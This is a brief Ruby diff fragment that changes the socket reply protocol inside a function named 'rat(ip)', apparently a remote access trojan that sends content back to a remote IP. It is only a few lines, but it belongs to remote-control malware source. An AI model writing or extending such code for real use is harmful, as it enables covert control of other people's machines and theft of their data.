@@ -68,8 +68,8 @@ def rat(ip)
           else
             socket.puts 'done'
           end
+          socket.puts content.length
           socket.puts content
-          socket.puts 'done'
         else
           socket.puts 'error'
         end
